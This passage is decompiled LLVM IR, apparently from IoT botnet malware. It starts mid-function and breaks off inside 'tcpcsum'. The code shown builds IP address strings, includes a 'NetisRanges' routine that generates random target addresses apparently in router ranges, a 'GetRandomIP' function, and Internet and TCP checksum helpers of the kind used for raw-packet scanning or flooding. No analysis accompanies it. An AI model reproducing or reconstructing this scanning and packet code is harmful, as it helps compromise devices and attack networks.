  %v6_c3f0 = sext i8 %v3_c3e4 to i32
  %v8_c3f0 = call i32 @szprintf(i32 %v2_c3cc, i32 ptrtoint ([13 x i8]* @global_var_1e50c.284 to i32), i32 %v4_c3f0, i32 %v6_c3f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c3f4

dec_label_pc_c3f4:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c3cc
  %v7_c3f8 = icmp eq i32 %v2_acd8, 104
  br i1 %v7_c3f8, label %dec_label_pc_c400, label %dec_label_pc_c428

dec_label_pc_c400:                                ; preds = %dec_label_pc_c3f4
  %v2_c400 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c40c = load i8, i8* @global_var_28589.78, align 1
  %v3_c418 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c424 = sext i8 %v3_c40c to i32
  %v6_c424 = sext i8 %v3_c418 to i32
  %v8_c424 = call i32 @szprintf(i32 %v2_c400, i32 ptrtoint ([13 x i8]* @global_var_1e51c.286 to i32), i32 %v4_c424, i32 %v6_c424, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c428

dec_label_pc_c428:                                ; preds = %dec_label_pc_c3f4, %dec_label_pc_c400
  %v7_c42c = icmp eq i32 %v2_acd8, 105
  br i1 %v7_c42c, label %dec_label_pc_c434, label %dec_label_pc_c45c

dec_label_pc_c434:                                ; preds = %dec_label_pc_c428
  %v2_c434 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c440 = load i8, i8* @global_var_28589.78, align 1
  %v3_c44c = load i8, i8* @global_var_2858a.79, align 1
  %v4_c458 = sext i8 %v3_c440 to i32
  %v6_c458 = sext i8 %v3_c44c to i32
  %v8_c458 = call i32 @szprintf(i32 %v2_c434, i32 ptrtoint ([13 x i8]* @global_var_1e52c.288 to i32), i32 %v4_c458, i32 %v6_c458, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c45c

dec_label_pc_c45c:                                ; preds = %dec_label_pc_c428, %dec_label_pc_c434
  %v7_c460 = icmp eq i32 %v2_acd8, 106
  br i1 %v7_c460, label %dec_label_pc_c468, label %dec_label_pc_c490

dec_label_pc_c468:                                ; preds = %dec_label_pc_c45c
  %v2_c468 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c474 = load i8, i8* @global_var_28589.78, align 1
  %v3_c480 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c48c = sext i8 %v3_c474 to i32
  %v6_c48c = sext i8 %v3_c480 to i32
  %v8_c48c = call i32 @szprintf(i32 %v2_c468, i32 ptrtoint ([12 x i8]* @global_var_1e53c.290 to i32), i32 %v4_c48c, i32 %v6_c48c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c490

dec_label_pc_c490:                                ; preds = %dec_label_pc_c45c, %dec_label_pc_c468
  %v7_c494 = icmp eq i32 %v2_acd8, 107
  br i1 %v7_c494, label %dec_label_pc_c49c, label %dec_label_pc_c4c4

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c490
  %v2_c49c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4a8 = load i8, i8* @global_var_28589.78, align 1
  %v3_c4b4 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c4c0 = sext i8 %v3_c4a8 to i32
  %v6_c4c0 = sext i8 %v3_c4b4 to i32
  %v8_c4c0 = call i32 @szprintf(i32 %v2_c49c, i32 ptrtoint ([13 x i8]* @global_var_1e548.292 to i32), i32 %v4_c4c0, i32 %v6_c4c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4c4

dec_label_pc_c4c4:                                ; preds = %dec_label_pc_c490, %dec_label_pc_c49c
  %v7_c4c8 = icmp eq i32 %v2_acd8, 108
  br i1 %v7_c4c8, label %dec_label_pc_c4d0, label %dec_label_pc_c4f8

dec_label_pc_c4d0:                                ; preds = %dec_label_pc_c4c4
  %v2_c4d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c4dc = load i8, i8* @global_var_28589.78, align 1
  %v3_c4e8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c4f4 = sext i8 %v3_c4dc to i32
  %v6_c4f4 = sext i8 %v3_c4e8 to i32
  %v8_c4f4 = call i32 @szprintf(i32 %v2_c4d0, i32 ptrtoint ([14 x i8]* @global_var_1e558.294 to i32), i32 %v4_c4f4, i32 %v6_c4f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c4f8

dec_label_pc_c4f8:                                ; preds = %dec_label_pc_c4c4, %dec_label_pc_c4d0
  %v7_c4fc = icmp eq i32 %v2_acd8, 109
  br i1 %v7_c4fc, label %dec_label_pc_c504, label %dec_label_pc_c52c

dec_label_pc_c504:                                ; preds = %dec_label_pc_c4f8
  %v2_c504 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c510 = load i8, i8* @global_var_28589.78, align 1
  %v3_c51c = load i8, i8* @global_var_2858a.79, align 1
  %v4_c528 = sext i8 %v3_c510 to i32
  %v6_c528 = sext i8 %v3_c51c to i32
  %v8_c528 = call i32 @szprintf(i32 %v2_c504, i32 ptrtoint ([14 x i8]* @global_var_1e568.296 to i32), i32 %v4_c528, i32 %v6_c528, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c52c

dec_label_pc_c52c:                                ; preds = %dec_label_pc_c4f8, %dec_label_pc_c504
  %v7_c530 = icmp eq i32 %v2_acd8, 110
  br i1 %v7_c530, label %dec_label_pc_c538, label %dec_label_pc_c560

dec_label_pc_c538:                                ; preds = %dec_label_pc_c52c
  %v2_c538 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c544 = load i8, i8* @global_var_28589.78, align 1
  %v3_c550 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c55c = sext i8 %v3_c544 to i32
  %v6_c55c = sext i8 %v3_c550 to i32
  %v8_c55c = call i32 @szprintf(i32 %v2_c538, i32 ptrtoint ([13 x i8]* @global_var_1e578.298 to i32), i32 %v4_c55c, i32 %v6_c55c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c560

dec_label_pc_c560:                                ; preds = %dec_label_pc_c52c, %dec_label_pc_c538
  %v7_c564 = icmp eq i32 %v2_acd8, 111
  br i1 %v7_c564, label %dec_label_pc_c56c, label %dec_label_pc_c594

dec_label_pc_c56c:                                ; preds = %dec_label_pc_c560
  %v2_c56c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c578 = load i8, i8* @global_var_28589.78, align 1
  %v3_c584 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c590 = sext i8 %v3_c578 to i32
  %v6_c590 = sext i8 %v3_c584 to i32
  %v8_c590 = call i32 @szprintf(i32 %v2_c56c, i32 ptrtoint ([14 x i8]* @global_var_1e588.300 to i32), i32 %v4_c590, i32 %v6_c590, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c594

dec_label_pc_c594:                                ; preds = %dec_label_pc_c560, %dec_label_pc_c56c
  %v7_c598 = icmp eq i32 %v2_acd8, 112
  br i1 %v7_c598, label %dec_label_pc_c5a0, label %dec_label_pc_c5c8

dec_label_pc_c5a0:                                ; preds = %dec_label_pc_c594
  %v2_c5a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5ac = load i8, i8* @global_var_28589.78, align 1
  %v3_c5b8 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c5c4 = sext i8 %v3_c5ac to i32
  %v6_c5c4 = sext i8 %v3_c5b8 to i32
  %v8_c5c4 = call i32 @szprintf(i32 %v2_c5a0, i32 ptrtoint ([14 x i8]* @global_var_1e598.302 to i32), i32 %v4_c5c4, i32 %v6_c5c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5c8

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_c594, %dec_label_pc_c5a0
  %v7_c5cc = icmp eq i32 %v2_acd8, 113
  br i1 %v7_c5cc, label %dec_label_pc_c5d4, label %dec_label_pc_c5fc

dec_label_pc_c5d4:                                ; preds = %dec_label_pc_c5c8
  %v2_c5d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c5e0 = load i8, i8* @global_var_28589.78, align 1
  %v3_c5ec = load i8, i8* @global_var_2858a.79, align 1
  %v4_c5f8 = sext i8 %v3_c5e0 to i32
  %v6_c5f8 = sext i8 %v3_c5ec to i32
  %v8_c5f8 = call i32 @szprintf(i32 %v2_c5d4, i32 ptrtoint ([13 x i8]* @global_var_1e5a8.304 to i32), i32 %v4_c5f8, i32 %v6_c5f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c5fc

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5c8, %dec_label_pc_c5d4
  %v7_c600 = icmp eq i32 %v2_acd8, 114
  %v2_c608 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_c600, label %dec_label_pc_c608, label %dec_label_pc_c630

dec_label_pc_c608:                                ; preds = %dec_label_pc_c5fc
  %v3_c614 = load i8, i8* @global_var_28589.78, align 1
  %v3_c620 = load i8, i8* @global_var_2858a.79, align 1
  %v4_c62c = sext i8 %v3_c614 to i32
  %v6_c62c = sext i8 %v3_c620 to i32
  %v8_c62c = call i32 @szprintf(i32 %v2_c608, i32 ptrtoint ([14 x i8]* @global_var_1e5b8.306 to i32), i32 %v4_c62c, i32 %v6_c62c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c630

dec_label_pc_c630:                                ; preds = %dec_label_pc_c5fc, %dec_label_pc_c608
  br i1 false, label %dec_label_pc_c63c, label %dec_label_pc_c664

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c630
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c630, %dec_label_pc_c63c
  store i32 %v2_c608, i32* @r0, align 4
  %v1_c66c = call i32 @inet_addr(i32 %v2_c608)
  store i32 %v3_ab54, i32* @fp, align 4
  ret i32 %v1_c66c

; uselistorder directives
  uselistorder i32 %v2_c608, { 1, 0, 2 }
  uselistorder i32 %v0_ac74, { 1, 0 }
  uselistorder i32 %v0_ac28, { 1, 0 }
  uselistorder i32 %v0_abdc, { 1, 0 }
  uselistorder i32 %v0_ab90, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1e138.157 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1df44.85 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1df34.83 to i32), { 1, 0 }
  uselistorder i8* @global_var_2858a.79, { 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0 }
  uselistorder label %dec_label_pc_c630, { 1, 0 }
  uselistorder label %dec_label_pc_c5fc, { 1, 0 }
  uselistorder label %dec_label_pc_c5c8, { 1, 0 }
  uselistorder label %dec_label_pc_c594, { 1, 0 }
  uselistorder label %dec_label_pc_c560, { 1, 0 }
  uselistorder label %dec_label_pc_c52c, { 1, 0 }
  uselistorder label %dec_label_pc_c4f8, { 1, 0 }
  uselistorder label %dec_label_pc_c4c4, { 1, 0 }
  uselistorder label %dec_label_pc_c490, { 1, 0 }
  uselistorder label %dec_label_pc_c45c, { 1, 0 }
  uselistorder label %dec_label_pc_c428, { 1, 0 }
  uselistorder label %dec_label_pc_c3f4, { 1, 0 }
  uselistorder label %dec_label_pc_c3c0, { 1, 0 }
  uselistorder label %dec_label_pc_c38c, { 1, 0 }
  uselistorder label %dec_label_pc_c358, { 1, 0 }
  uselistorder label %dec_label_pc_c324, { 1, 0 }
  uselistorder label %dec_label_pc_c2f0, { 1, 0 }
  uselistorder label %dec_label_pc_c2bc, { 1, 0 }
  uselistorder label %dec_label_pc_c288, { 1, 0 }
  uselistorder label %dec_label_pc_c254, { 1, 0 }
  uselistorder label %dec_label_pc_c220, { 1, 0 }
  uselistorder label %dec_label_pc_c1ec, { 1, 0 }
  uselistorder label %dec_label_pc_c1b8, { 1, 0 }
  uselistorder label %dec_label_pc_c184, { 1, 0 }
  uselistorder label %dec_label_pc_c150, { 1, 0 }
  uselistorder label %dec_label_pc_c11c, { 1, 0 }
  uselistorder label %dec_label_pc_c0e8, { 1, 0 }
  uselistorder label %dec_label_pc_c0b4, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 1, 0 }
  uselistorder label %dec_label_pc_c04c, { 1, 0 }
  uselistorder label %dec_label_pc_c018, { 1, 0 }
  uselistorder label %dec_label_pc_bfe4, { 1, 0 }
  uselistorder label %dec_label_pc_bfb0, { 1, 0 }
  uselistorder label %dec_label_pc_bf7c, { 1, 0 }
  uselistorder label %dec_label_pc_bf48, { 1, 0 }
  uselistorder label %dec_label_pc_bf14, { 1, 0 }
  uselistorder label %dec_label_pc_bee0, { 1, 0 }
  uselistorder label %dec_label_pc_beac, { 1, 0 }
  uselistorder label %dec_label_pc_be78, { 1, 0 }
  uselistorder label %dec_label_pc_be44, { 1, 0 }
  uselistorder label %dec_label_pc_be10, { 1, 0 }
  uselistorder label %dec_label_pc_bddc, { 1, 0 }
  uselistorder label %dec_label_pc_bda8, { 1, 0 }
  uselistorder label %dec_label_pc_bd74, { 1, 0 }
  uselistorder label %dec_label_pc_bd40, { 1, 0 }
  uselistorder label %dec_label_pc_bd0c, { 1, 0 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_bad0, { 1, 0 }
  uselistorder label %dec_label_pc_ba9c, { 1, 0 }
  uselistorder label %dec_label_pc_ba68, { 1, 0 }
  uselistorder label %dec_label_pc_ba34, { 1, 0 }
  uselistorder label %dec_label_pc_ba00, { 1, 0 }
  uselistorder label %dec_label_pc_b9cc, { 1, 0 }
  uselistorder label %dec_label_pc_b998, { 1, 0 }
  uselistorder label %dec_label_pc_b964, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0 }
  uselistorder label %dec_label_pc_b8fc, { 1, 0 }
  uselistorder label %dec_label_pc_b8c8, { 1, 0 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b860, { 1, 0 }
  uselistorder label %dec_label_pc_b82c, { 1, 0 }
  uselistorder label %dec_label_pc_b7f8, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %dec_label_pc_b75c, { 1, 0 }
  uselistorder label %dec_label_pc_b728, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
  uselistorder label %dec_label_pc_b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %dec_label_pc_b658, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 1, 0 }
  uselistorder label %dec_label_pc_b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 1, 0 }
  uselistorder label %dec_label_pc_b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 1, 0 }
  uselistorder label %dec_label_pc_b450, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b3e8, { 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b380, { 1, 0 }
  uselistorder label %dec_label_pc_b34c, { 1, 0 }
  uselistorder label %dec_label_pc_b318, { 1, 0 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b178, { 1, 0 }
  uselistorder label %dec_label_pc_b144, { 1, 0 }
  uselistorder label %dec_label_pc_b110, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0a8, { 1, 0 }
  uselistorder label %dec_label_pc_b074, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
  uselistorder label %dec_label_pc_b00c, { 1, 0 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af3c, { 1, 0 }
  uselistorder label %dec_label_pc_af08, { 1, 0 }
  uselistorder label %dec_label_pc_aed4, { 1, 0 }
  uselistorder label %dec_label_pc_aea0, { 1, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_ae38, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_ad9c, { 1, 0 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
  uselistorder label %dec_label_pc_ad34, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_c688 = load i32, i32* @r4, align 4
  store i32 50832, i32* %stack_var_-4, align 4
  %v2_c68c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c68c, i32* @fp, align 4
  %v0_c694 = call i32 @rand()
  %v1_c69c = urem i32 %v0_c694, 16
  %v4_c6ac = mul nuw nsw i32 %v1_c69c, 4
  %v5_c6ac = add i32 %v4_c6ac, ptrtoint (i32* @global_var_282ac.308 to i32)
  %v6_c6ac = inttoptr i32 %v5_c6ac to i32*
  %v7_c6ac = load i32, i32* %v6_c6ac, align 4
  %v1_c6b8 = trunc i32 %v7_c6ac to i8
  store i8 %v1_c6b8, i8* bitcast (i8** @global_var_28586.75 to i8*), align 4
  %v0_c6bc = call i32 @rand()
  %v2_c6d8 = sdiv i32 %v0_c6bc, 51
  %tmp18 = mul i32 %v2_c6d8, -255
  %v2_c6f0 = add i32 %tmp18, %v0_c6bc
  %v1_c704 = trunc i32 %v2_c6f0 to i8
  store i8 %v1_c704, i8* @global_var_28587.76, align 1
  %v0_c708 = call i32 @rand()
  %v2_c724 = sdiv i32 %v0_c708, 51
  %tmp19 = mul i32 %v2_c724, -255
  %v2_c73c = add i32 %tmp19, %v0_c708
  %v1_c750 = trunc i32 %v2_c73c to i8
  store i8 %v1_c750, i8* @global_var_28588.77, align 1
  %v0_c754 = call i32 @rand()
  %v2_c770 = sdiv i32 %v0_c754, 51
  %tmp20 = mul i32 %v2_c770, -255
  %v2_c788 = add i32 %tmp20, %v0_c754
  %v1_c79c = trunc i32 %v2_c788 to i8
  store i8 %v1_c79c, i8* @global_var_28589.78, align 1
  %v2_c7a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  %v2_c7dc = load i8, i8* bitcast (i8** @global_var_28586.75 to i8*), align 4
  %v3_c7dc = zext i8 %v2_c7dc to i32
  %v3_c7e8 = load i8, i8* @global_var_28587.76, align 1
  %v4_c7e8 = zext i8 %v3_c7e8 to i32
  store i32 %v4_c7e8, i32* @r4, align 4
  %v3_c7f4 = load i8, i8* @global_var_28588.77, align 1
  %v6_c81c = sext i8 %v3_c7e8 to i32
  %v8_c81c = sext i8 %v3_c7f4 to i32
  %v9_c81c = call i32 @szprintf(i32 %v2_c7a0, i32 ptrtoint ([12 x i8]* @global_var_1e5c8.312 to i32), i32 %v3_c7dc, i32 %v6_c81c, i32 %v8_c81c)
  store i32 %v2_c7a0, i32* @r0, align 4
  %v1_c828 = call i32 @inet_addr(i32 %v2_c7a0)
  store i32 %v3_c688, i32* @r4, align 4
  ret i32 %v1_c828

; uselistorder directives
  uselistorder i32 %v2_c7a0, { 2, 1, 0 }
  uselistorder i32 %v0_c754, { 1, 0 }
  uselistorder i32 %v0_c708, { 1, 0 }
  uselistorder i32 %v0_c6bc, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_28589.78, { 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_28588.77, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_28587.76, { 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_28586.75 to i8*), { 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_c854 = load i32, i32* @fp, align 4
  %v2_c868 = load i32, i32* @global_var_2e7cc.314, align 4
  %v1_c870 = call i32 @__GI_ntohl(i32 %v2_c868)
  %v2_c87c = and i32 %v1_c870, %arg1
  %v0_c884 = call i32 @rand_cmwc()
  %v1_c890 = sub i32 -1, %arg1
  %v2_c894 = and i32 %v0_c884, %v1_c890
  %v2_c89c = xor i32 %v2_c894, %v2_c87c
  store i32 %v3_c854, i32* @fp, align 4
  ret i32 %v2_c89c
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_c9289 = icmp sgt i32 %arg2, 1
  br i1 %v8_c9289, label %dec_label_pc_c8e0, label %dec_label_pc_c92c

dec_label_pc_c8e0:                                ; preds = %entry, %dec_label_pc_c8e0
  %v2_c8f4 = phi i32 [ %v2_c8f8, %dec_label_pc_c8e0 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_c8fc, %dec_label_pc_c8e0 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_c918, %dec_label_pc_c8e0 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_c910, %dec_label_pc_c8e0 ], [ %arg1, %entry ]
  %v4_c8e0 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_c8e4 = load i16, i16* %stack_var_-36.010, align 2
  %v3_c8e4 = zext i16 %v2_c8e4 to i32
  %v2_c8f8 = add i32 %v3_c8e4, %v2_c8f4
  %v3_c8f8 = icmp ult i32 %v2_c8f8, %v2_c8f4
  %v4_c8fc = zext i1 %v3_c8f8 to i32
  %v5_c8fc = add i32 %v4_c8fc, %stack_var_-44.012
  %v1_c90c = add i32 %v4_c8e0, 2
  %v5_c910 = inttoptr i32 %v1_c90c to i16*
  %v1_c918 = add nsw i32 %stack_var_-40.011, -2
  %v8_c928 = icmp sgt i32 %v1_c918, 1
  br i1 %v8_c928, label %dec_label_pc_c8e0, label %dec_label_pc_c920.dec_label_pc_c92c_crit_edge

dec_label_pc_c920.dec_label_pc_c92c_crit_edge:    ; preds = %dec_label_pc_c8e0
  br label %dec_label_pc_c92c

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c920.dec_label_pc_c92c_crit_edge, %entry
  %v2_c94c = phi i32 [ %v2_c8f8, %dec_label_pc_c920.dec_label_pc_c92c_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_c910, %dec_label_pc_c920.dec_label_pc_c92c_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_c8fc, %dec_label_pc_c920.dec_label_pc_c92c_crit_edge ], [ 0, %entry ]
  %v7_c924.lcssa.in = phi i32 [ %v1_c918, %dec_label_pc_c920.dec_label_pc_c92c_crit_edge ], [ %arg2, %entry ]
  %v7_c924.lcssa = icmp eq i32 %v7_c924.lcssa.in, 1
  br i1 %v7_c924.lcssa, label %dec_label_pc_c938, label %dec_label_pc_c9b4.preheader

dec_label_pc_c938:                                ; preds = %dec_label_pc_c92c
  %v1_c93c = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_c93c = load i8, i8* %v1_c93c, align 1
  %v3_c93c = zext i8 %v2_c93c to i32
  %v2_c950 = add i32 %v3_c93c, %v2_c94c
  %v3_c950 = icmp ult i32 %v2_c950, %v2_c94c
  %v4_c954 = zext i1 %v3_c950 to i32
  %v5_c954 = add i32 %v4_c954, %stack_var_-44.0.lcssa
  br label %dec_label_pc_c9b4.preheader

dec_label_pc_c9b4.preheader:                      ; preds = %dec_label_pc_c938, %dec_label_pc_c92c
  %v3_c9e0.ph = phi i32 [ %v2_c94c, %dec_label_pc_c92c ], [ %v2_c950, %dec_label_pc_c938 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_c92c ], [ %v5_c954, %dec_label_pc_c938 ]
  %v3_c9b837 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_c9c038 = udiv i32 %v3_c9e0.ph, 65536
  %v2_c9c439 = or i32 %v3_c9b837, %v3_c9c038
  %v3_c9cc40 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_c9d441 = or i32 %v2_c9c439, %v3_c9cc40
  %v2_c9d842 = icmp eq i32 %v2_c9d441, 0
  br i1 %v2_c9d842, label %dec_label_pc_c9e0, label %dec_label_pc_c964

dec_label_pc_c964:                                ; preds = %dec_label_pc_c9b4.preheader, %dec_label_pc_c964
  %v3_c9cc45 = phi i32 [ %v3_c9cc, %dec_label_pc_c964 ], [ %v3_c9cc40, %dec_label_pc_c9b4.preheader ]
  %v2_c9c444 = phi i32 [ %v2_c9c4, %dec_label_pc_c964 ], [ %v2_c9c439, %dec_label_pc_c9b4.preheader ]
  %v3_c9e043 = phi i32 [ %v2_c9a4, %dec_label_pc_c964 ], [ %v3_c9e0.ph, %dec_label_pc_c9b4.preheader ]
  %v2_c978 = urem i32 %v3_c9e043, 65536
  %v2_c9a4 = add i32 %v2_c9c444, %v2_c978
  %v3_c9a4 = icmp ult i32 %v2_c9a4, %v2_c978
  %v4_c9a8 = zext i1 %v3_c9a4 to i32
  %v5_c9a8 = add nuw nsw i32 %v4_c9a8, %v3_c9cc45
  %v3_c9b8 = mul i32 %v5_c9a8, 65536
  %v3_c9c0 = udiv i32 %v2_c9a4, 65536
  %v2_c9c4 = or i32 %v3_c9b8, %v3_c9c0
  %v3_c9cc = udiv i32 %v5_c9a8, 65536
  %v2_c9d4 = or i32 %v2_c9c4, %v3_c9cc
  %v2_c9d8 = icmp eq i32 %v2_c9d4, 0
  br i1 %v2_c9d8, label %dec_label_pc_c9b4.dec_label_pc_c9e0_crit_edge, label %dec_label_pc_c964

dec_label_pc_c9b4.dec_label_pc_c9e0_crit_edge:    ; preds = %dec_label_pc_c964
  br label %dec_label_pc_c9e0

dec_label_pc_c9e0:                                ; preds = %dec_label_pc_c9b4.dec_label_pc_c9e0_crit_edge, %dec_label_pc_c9b4.preheader
  %v3_c9e0.lcssa = phi i32 [ %v2_c9a4, %dec_label_pc_c9b4.dec_label_pc_c9e0_crit_edge ], [ %v3_c9e0.ph, %dec_label_pc_c9b4.preheader ]
  %v1_c9ec = urem i32 %v3_c9e0.lcssa, 65536
  %v3_c9f4 = xor i32 %v1_c9ec, 65535
  ret i32 %v3_c9f4

; uselistorder directives
  uselistorder i32 %v2_c9c4, { 1, 0 }
  uselistorder i32 %v5_c9a8, { 1, 0 }
  uselistorder i32 %v2_c9a4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_c9cc40, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_c9e0.ph, { 2, 1, 0 }
  uselistorder i32 %v2_c94c, { 0, 2, 1 }
  uselistorder i32 %v1_c918, { 0, 2, 1 }
  uselistorder i32 %v2_c8f8, { 0, 2, 1 }
  uselistorder i32 %v2_c8f4, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c964, { 1, 0 }
  uselistorder label %dec_label_pc_c8e0, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ca0c = load i32, i32* @fp, align 4
  store i32 51732, i32* %stack_var_-4, align 4
  %v2_ca10 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ca10, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_ca30 = add i32 %arg1, 12
  %v2_ca30 = inttoptr i32 %v1_ca30 to i32*
